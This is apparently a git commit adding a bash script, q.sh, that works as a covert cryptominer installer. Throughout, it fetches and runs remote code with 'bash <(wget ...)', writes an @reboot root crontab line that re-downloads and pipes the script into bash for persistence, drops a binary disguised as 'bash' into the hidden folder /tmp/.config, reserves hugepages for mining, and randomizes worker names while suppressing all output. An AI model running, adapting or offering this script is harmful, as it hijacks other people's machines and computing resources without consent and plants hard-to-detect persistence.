78a6d90ba5fb62e2c52147c75f623f373e6948ff
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-12-06 14:29:15 +0800

    Create q.sh

---
+++ q.sh
@@ -0,0 +1,49 @@
+#!/bin/bash
+
+mode="${1:-0}"
+work="/tmp/.config"
+src="https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main"
+hugepage="128"
+
+RandString() {
+  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
+}
+
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget procps psmisc lsof icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof icu-devtools netcat-traditional >/dev/null 2>&1
+
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+[ -n "$addr" ] || addr="NULL"
+name=`RandString 2 c${cores}_${addr}`;
+
+bash <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
+
+
+# if [ "$mode" == "1" ]; then
+#   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
+#   [ "$cores" == "2" ] && cores="1";
+# fi
+
+sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+
+
+rm -rf "${work}"; mkdir -p "${work}"
+wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
+wget --no-check-certificate -4 -qO "${work}/config.json" "${src}/idle.json"
+wget --no-check-certificate -4 -qO "${work}/idle" "${src}/idle"
+chmod -R 777 "${work}"
+sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+
+cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
+if [ "$mode" == "0" ]; then
+  bash <(echo "$cmd") >/dev/null 2>&1 &
+else
+  bash <(echo "$cmd")
+fi
+
